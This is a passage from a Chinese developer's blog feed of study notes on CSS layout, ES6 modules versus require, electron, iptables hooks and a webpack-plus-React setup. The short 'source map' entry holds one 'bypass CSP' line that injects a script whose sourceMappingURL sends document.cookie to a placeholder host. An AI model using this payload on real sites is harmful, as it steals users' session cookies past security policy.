<li>上面说到两个float的元素，还是会跟着在一起，这时候想要block2到block1下一行的话，就要给block2一个<code>clear:left</code>,意思是清除block2左边的浮动元素，因为是block2左边不能有东西在浮动所以block2就自己下来一行了,这个应该是解决高度塌陷的问题吧,把由于高度不一造成的不该上来的元素再挤下去</li>
<li>是为了把父元素重新撑起来??</li>
</ol>
<p>是这样子的两个作用吗</p>
<p>在word里就有浮动，是为了文字环绕图片的效果，那么浮动是会影响文本内容的咯</p>
<p>浮动可以做水平的菜单，这个时候比如是<code>&lt;ul&gt;</code>里面套着<code>&lt;li&gt;</code>,要实现效果一定是<code>&lt;li&gt;</code>要float,但由于<code>&lt;li&gt;</code>浮动了，那就撑不起来父元素<code>&lt;ul&gt;</code>,这个时候，父元素的<code>background-color</code>之类的就没啥用了，所以这个时候要父元素也<code>float</code></p>
<p>细节还需要再继续然后再看下，现在有其他事情要做啊，TAT</p>
<p>在网上查找了一下，除了clear还有其他办法让父元素重新撑起来<br>清除浮动:</p>
<ol>
<li><p>clear:both</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>father<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>son<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>son<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clear<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!--新增的一个元素，没有语义--></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的<code>clear</code>是</p>
<pre class="line-numbers language-css"><code class="language-css"><span class="token selector"><span class="token class">.clear</span> </span><span class="token punctuation">{</span>
 <span class="token property">clear</span><span class="token punctuation">:</span>both<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>是新增了一个<code>clear:both</code>的元素来实现的</p>
</li>
<li><p>overflow:hidden<br>这个我以前没用过，我只会前面那个其实<br>只要给父元素设置一个<code>overflow:hidden</code>就可以了</p>
</li>
</ol>
<h2 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h2><p>既然我的inline-block既可以形成盒模型，又能水平排布，那我还为什么要使用浮动呢<br>这个还没查到<br>不过发现了这个<a href="http://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/" target="_blank" rel="external">inline-block元素间间距去除办法</a></p>
<p>然后还有<a href="http://www.w3cplus.com/css/inline-blocks.html" target="_blank" rel="external">应不应该使用inline-block代替float</a></p>
<p>大佬有这样一句话</p>
<blockquote>
<p>就是每一行所有的inline元素和inline-block元素会共同形成一个line boxes，这个line box的高度由里面最高的元素决定。所以，即使inline-block属性的列表元素高度异常，撑开的是整个line boxes的高度，因而，不会与下一行的列表元素发生错位</p>
</blockquote>
<p>看起来就是说inline-block不会有高度塌陷的问题</p>
<h3 id="inline-block和float的区别"><a href="#inline-block和float的区别" class="headerlink" title="inline-block和float的区别"></a>inline-block和float的区别</h3><ol>
<li>float会脱离文档流,而inline-block不会</li>
<li>inline-block会导致一个元素见出现空白间隙的<a href="http://www.w3cplus.com/css/fighting-the-space-between-inline-block-elements" target="_blank" rel="external">问题</a></li>
<li>inline-block可以轻松地做一个水平居中只通过<code>text-align</code> </li>
<li>inline-block可以更好实现垂直对齐，就是前面说的float那个高度塌陷的问题</li>
</ol>
<p>大佬说道</p>
<ul>
<li>使用inline-block：当你需要控制元素的垂直对齐跟水平排列时，使用inline-block。</li>
<li>使用浮动：当你需要让元素环绕某一个元素时，或者需要支持旧版本ie，或者不想处理inline-block带来的空白问题时，使用浮动。</li>
</ul>
<p>所以其实我们常常做的商品展示列表和水平菜单，正确的使用方式是使用<code>inline-block</code><br>而只有在要做文字环绕图片的时候才使用float</p>
<h2 id="positioning-schemes"><a href="#positioning-schemes" class="headerlink" title="positioning schemes"></a>positioning schemes</h2><p>据说有三种</p>
<pre><code>Normal flow – In CSS 2.1, normal flow includes block formatting of block boxes, inline formatting of inline boxes, relative positioning of block or inline boxes, and positioning of run-in boxes.

Floats – In the float model, a box is first laid out according to the normal flow, then taken out of the flow and shifted to the left or right as far as possible. Content may flow along the side of a float.

Absolute positioning – In the absolute positioning model, a box is removed from the normal flow entirely (it has no impact on later siblings) and assigned a position with respect to a containing block.
</code></pre><ol>
<li>正常流(我们常常说的文档流)</li>
<li>浮动</li>
<li>绝对定位</li>
</ol>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>如果没有明写出来，好像，，，都是static</p>
<h3 id="relative"><a href="#relative" class="headerlink" title="relative"></a>relative</h3><p>相对定位，比较简单，不脱离文档流，所以原来的占据的位置还在，只是相对于自己原来的位置进行移动</p>
<h3 id="absolute"><a href="#absolute" class="headerlink" title="absolute"></a>absolute</h3><p>这个，额，比较复杂,也会脱离文档流<br>相对于第一个不是static的父元素进行定位<br>所以我们常常看到我们把absolute的父元素设置成<code>relative</code>，但不设置父元素移动<br>具体比较复杂，以后填坑</p>
<h3 id="fixed"><a href="#fixed" class="headerlink" title="fixed"></a>fixed</h3><p>相对浏览器窗口定位,所以会脱离文档流</p>
<h3 id="inherit"><a href="#inherit" class="headerlink" title="inherit"></a>inherit</h3><p>从父元素继承一下子</p>
<p>综上，是<code>absolute</code>和<code>fixed</code>,会脱离文档流<br>另外，我们前面说到的<code>float</code>也会脱离文档流</p>
<h2 id="负外边距"><a href="#负外边距" class="headerlink" title="负外边距"></a>负外边距</h2><h2 id="line-box-和-block-box"><a href="#line-box-和-block-box" class="headerlink" title="line box 和 block box"></a>line box 和 block box</h2><p>一直没有注意，盒模型有两种？？<br>这部分参考<a href="https://segmentfault.com/a/1190000005155084" target="_blank" rel="external">这个</a><br>这什么鬼<br>好像没怎么看懂</p>
<h2 id="rem-和-em"><a href="#rem-和-em" class="headerlink" title="rem 和 em"></a>rem 和 em</h2><p>rem =&gt; font size of the root element =&gt; 相对于根元素<br>em =&gt; font size of the element =&gt; 相对于父元素<br>具体参考<a href="https://isux.tencent.com/web-app-rem.html" target="_blank" rel="external">这里</a></p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>参考<a href="https://segmentfault.com/a/1190000004026388" target="_blank" rel="external">这里</a>和<a href="https://segmentfault.com/a/1190000004105774" target="_blank" rel="external">这里</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://vanseodesign.com/css/display-property/" target="_blank" rel="external">http://vanseodesign.com/css/display-property/</a><br><a href="http://vanseodesign.com/css/understanding-css-floats/" target="_blank" rel="external">http://vanseodesign.com/css/understanding-css-floats/</a><br><a href="https://segmentfault.com/a/1190000005155084" target="_blank" rel="external">https://segmentfault.com/a/1190000005155084</a> (CSS 盒模型Block box与Line box)</p>
]]></content>
      
        
        <tags>
            
            <tag> css </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[electron]]></title>
      <url>/2017/07/13/electron/</url>
      <content type="html"><![CDATA[<p>在很远古的时候，曾经使用过<code>nw.js</code>,当时在做C++课设，被狠狠的坑了一把<br>隐约记得好多bug，验收前几天还能看到<code>nw.js</code>每天各种update，各种issue</p>
<p>electron的<a href="https://github.com/electron/electron/blob/master/docs-translations/zh-CN/development/atom-shell-vs-node-webkit.md" target="_blank" rel="external">github</a>上有<code>electron</code>和<code>nw.js</code>的差异</p>
<p>先让我mark一下，然后学习吧</p>
]]></content>
      
        
        <tags>
            
            <tag> node </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[解构赋值]]></title>
      <url>/2017/07/13/%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</url>
      <content type="html"><![CDATA[<p>蠢得很啊啊啊啊</p>
<p>今天又看到</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>app<span class="token punctuation">,</span> BrowerWindow<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个是对象解构赋值<br>在electron模块里有类似的代码</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">...</span>
exports<span class="token punctuation">.</span>app <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token operator">...</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span>
exports<span class="token punctuation">.</span>BrowerWindow <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token operator">...</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的<code>require</code>也就是相当于</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">const</span> electron <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'electron'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> electron<span class="token punctuation">.</span>app<span class="token punctuation">;</span>
<span class="token keyword">const</span> BrowerWindow <span class="token operator">=</span> electron<span class="token punctuation">.</span>BrowerWindow<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>那这个和使用</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>app<span class="token punctuation">,</span> BrowerWindow<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'electron'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有什么区别呢</p>
<p>require/exports<br>这个是CommonJS,是Node.js的规范</p>
<p>import/export<br>这个是ES6的规范，但其实现在没有人支持他，都是由babel转换成为<code>require/exports</code>的，所以现阶段使用的<code>import/export</code>是编译成了<code>require/exports</code><br>在浏览器端使用<code>import</code>的话，只有babel还不行，必须要用<code>webpack</code>+<code>babel</code><br>在nodejs这边的话，我就不用<code>import</code>了<br>不过有个<code>babel-node</code>好像可以直接<code>import</code></p>
<p>不过区别到底在哪里</p>
<p>找到了下面的链接,是从使用方面</p>
<ol>
<li>imports and exports must be at the top level </li>
</ol>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">if</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./a'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./b'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//正确</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>xxx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">import</span> <span class="token string">'a'</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">import</span> <span class="token string">'b'</span>
<span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//语法错误</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>imports are hoisted <blockquote>
<p>我还查了下，这词啥意思，好像是说import可以变量提升,就是说放哪都行</p>
</blockquote>
</li>
</ol>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>foo<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'some_code'</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>实际上编译时import是提升到<code>the beginning of the current scope</code>，所以没错</p>
<ol>
<li>Imports are read-only views on exports<br>这个看起来比较，emmmmm~<br>好像是说<code>import</code>进来的是<code>live</code>的,<code>read-only</code>的, 其实就是一个<code>只读</code>的<code>引用</code><br>而<code>require</code>他就是一个,emmmm~,值传递,传进来就和原来的环境没有关系了<br>这个看<a href="http://es6.ruanyifeng.com/#docs/module-loader#ES6-%E6%A8%A1%E5%9D%97%E4%B8%8E-CommonJS-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B7%AE%E5%BC%82" target="_blank" rel="external">这里吧</a></li>
</ol>
<p>##<br>顺便还有<br>exports.xxx = yyy;<br>和module.exports = {<br>    xxx: yyy;<br>}<br>的区别<br>这里好像在朴灵的书上看过但不记得了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://exploringjs.com/es6/ch_modules.html#_imports-are-hoisted" target="_blank" rel="external">http://exploringjs.com/es6/ch_modules.html#_imports-are-hoisted</a> (炒鸡炒鸡不错)<br><a href="https://stackoverflow.com/questions/31354559/using-node-js-require-vs-es6-import-export" target="_blank" rel="external">https://stackoverflow.com/questions/31354559/using-node-js-require-vs-es6-import-export</a><br><a href="http://es6.ruanyifeng.com/#docs/module-loader#ES6-%E6%A8%A1%E5%9D%97%E4%B8%8E-CommonJS-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B7%AE%E5%BC%82" target="_blank" rel="external">http://es6.ruanyifeng.com/#docs/module-loader#ES6-%E6%A8%A1%E5%9D%97%E4%B8%8E-CommonJS-%E6%A8%A1%E5%9D%97%E7%9A%84%E5%B7%AE%E5%BC%82</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用inline-block]]></title>
      <url>/2017/07/13/%E4%BD%BF%E7%94%A8inline-block/</url>
      <content type="html"><![CDATA[<h2 id="据说"><a href="#据说" class="headerlink" title="据说"></a>据说</h2><p>inline-block 可以用来代替 float<br>好吧,从来没有注意过<br>一直在使用float</p>
<h2 id="盒模型"><a href="#盒模型" class="headerlink" title="盒模型"></a>盒模型</h2><pre><code>-----------------------------------------------------
|Margin|border|padding|content|padding|border|Margin|
-----------------------------------------------------
</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.w3cplus.com/css/inline-blocks.html" target="_blank" rel="external">http://www.w3cplus.com/css/inline-blocks.html</a> (inline-block)<br><a href="http://vanseodesign.com/css/understanding-css-floats/" target="_blank" rel="external">http://vanseodesign.com/css/understanding-css-floats/</a> (介绍float)</p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> css </tag>
            
            <tag> 前端 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[source map]]></title>
      <url>/2017/07/12/source-map/</url>
      <content type="html"><![CDATA[<h2 id="bypass-CSP"><a href="#bypass-CSP" class="headerlink" title="bypass CSP"></a>bypass CSP</h2><pre class="line-numbers language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script>//#  sourceMappingURL=https://request/?${escape(document.cookie)}&lt;/script>'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://segmentfault.com/a/1190000007544398" target="_blank" rel="external">https://segmentfault.com/a/1190000007544398</a> (哈哈哈，这个人和我一样)</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML5 Outliner]]></title>
      <url>/2017/07/12/HTML5-Outliner/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[iptables]]></title>
      <url>/2017/07/12/iptables/</url>
      <content type="html"><![CDATA[<p>其实从从来没有用过这个<br>因为不知道听谁说过这玩意，很危危险</p>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>iptables 是用户态的 而netfilter是内核态的<br>iptables是netfilter的一个前端???</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>Netfilter给<code>ipv4</code>定义了5个hook点</p>
<ul>
<li>PRE_ROUTING</li>
<li>LOCAL_IN</li>
<li>FORWARD</li>
<li>LOCAL_OUT</li>
<li>POST_ROUTING</li>
</ul>
<h3 id="各个hook点的位置"><a href="#各个hook点的位置" class="headerlink" title="各个hook点的位置"></a>各个hook点的位置</h3><pre class="line-numbers language-javascript"><code class="language-javascript">                          <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
Data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span>PRE_ROUTING <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">|</span>ROUTING<span class="token operator">|</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span>LOCAL_IN <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span>LOCAL_OUT <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span>POST_ROUTING
                          <span class="token operator">|</span>ROUTING<span class="token operator">|</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span>FORWARD  <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span>POST_ROUTING
                          <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>数据包过来，先过<code>PRE_ROUTING</code>,然后过一个路由,决定数据包是本机的,还是要转发<br>如果是本机的就回过<code>LOCAL_IN</code>,<code>LOCAL_OUT</code>,再<code>POST_ROUTING</code><br>如果是要直接转发的则要过<code>FORWARD</code>后,然后再<code>POST_ROUTING</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.chinaunix.net/uid-23069658-id-3160506.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-23069658-id-3160506.html</a><br><a href="http://blog.csdn.net/suiyuan19840208/article/details/19684883" target="_blank" rel="external">http://blog.csdn.net/suiyuan19840208/article/details/19684883</a><br><a href="https://zhuanlan.zhihu.com/p/21534942" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21534942</a></p>
]]></content>
      
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSR]]></title>
      <url>/2017/07/10/SSR/</url>
      <content type="html"><![CDATA[<p>Server-Side Rendering<br>ShadowsocksR<br>那么问题来了<br>阴阳师里SSR是什么的缩写</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[socket.io]]></title>
      <url>/2017/07/10/socket-io/</url>
      <content type="html"><![CDATA[<p>感觉很简单的API,好像很厉害的样子，就照着官网的demo敲了一下<br>顺便复习了一下express</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://socket.io/" target="_blank" rel="external">https://socket.io/</a><br><a href="http://expressjs.com/" target="_blank" rel="external">http://expressjs.com/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> socket </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浏览器里使用import]]></title>
      <url>/2017/07/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E9%87%8C%E4%BD%BF%E7%94%A8import/</url>
      <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>本来想只要在浏览器里用</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/react@15/dist/react.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/react-dom@15/dist/react-dom.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/babel-standalone@6/babel.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/babel<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
import React from 'react';
import ReactDOM from 'react-dom';

ReactDOM.render(
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello, world!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>,
  document.getElementById('root')
);
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样乱搞一下就可以了，结果发现会报错</p>
<pre><code>Uncaught ReferenceError: require is not defined
</code></pre><p>天哦，找了找资料，好像是说不能只用<code>babel</code>就实现浏览器里支持<code>import</code><br>看这样子只能用webpack</p>
<h2 id="学习webpack"><a href="#学习webpack" class="headerlink" title="学习webpack"></a>学习webpack</h2><p>最后的目录结构是这样子的</p>
<pre class="line-numbers language-dir"><code class="language-dir">.
├── app.js
├── bundle.js
├── index.html
├── node_modules
├── npm-debug.log
├── package.json
└── webpack.config.js
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="app-js"><a href="#app-js" class="headerlink" title="app.js"></a>app.js</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> ReactDOM <span class="token keyword">from</span> <span class="token string">'react-dom'</span><span class="token punctuation">;</span>

ReactDOM<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>
  <span class="token operator">&lt;</span>h1<span class="token operator">></span>Hello<span class="token punctuation">,</span> world<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span><span class="token punctuation">,</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>用webpack将app.js output成,然后引入到html里</p>
<h3 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h3><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bundle.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>遇到一个坑，就是这个<code>bundle.js</code>,放到root前面会报错，找不到root</p>
<blockquote>
<p>Uncaught Invariant Violation: _registerComponent(…): Target container is not a DOM element.</p>
</blockquote>
<h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">{</span>
  <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"react_learn"</span><span class="token punctuation">,</span>
  <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>
  <span class="token string">"description"</span><span class="token punctuation">:</span> <span class="token string">"an example"</span><span class="token punctuation">,</span>
  <span class="token string">"main"</span><span class="token punctuation">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>
  <span class="token string">"scripts"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
    <span class="token string">"test"</span><span class="token punctuation">:</span> <span class="token string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span><span class="token punctuation">,</span>
    <span class="token string">"build"</span><span class="token punctuation">:</span> <span class="token string">"webpack"</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">"author"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token string">"license"</span><span class="token punctuation">:</span> <span class="token string">"ISC"</span><span class="token punctuation">,</span>
  <span class="token string">"dependencies"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
    <span class="token string">"react"</span><span class="token punctuation">:</span> <span class="token string">"^15.6.1"</span><span class="token punctuation">,</span>
    <span class="token string">"react-dom"</span><span class="token punctuation">:</span> <span class="token string">"^15.6.1"</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token string">"devDependencies"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
    <span class="token string">"babel-core"</span><span class="token punctuation">:</span> <span class="token string">"^6.25.0"</span><span class="token punctuation">,</span>
    <span class="token string">"babel-loader"</span><span class="token punctuation">:</span> <span class="token string">"^7.1.1"</span><span class="token punctuation">,</span>
    <span class="token string">"babel-preset-es2015"</span><span class="token punctuation">:</span> <span class="token string">"^6.24.1"</span><span class="token punctuation">,</span>
    <span class="token string">"babel-preset-react"</span><span class="token punctuation">:</span> <span class="token string">"^6.24.1"</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里是npm install 了 <code>react</code>, <code>react-dom</code>,以及打包相关的<code>babel-*</code>,这个一堆babel是为了支持es6的<code>import</code>,也就是我们目的所在</p>
<h3 id="webpack-config-js"><a href="#webpack-config-js" class="headerlink" title="webpack.config.js"></a>webpack.config.js</h3><pre class="line-numbers language-javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
  entry<span class="token punctuation">:</span> <span class="token string">'./app.js'</span><span class="token punctuation">,</span>
  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>
    filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>
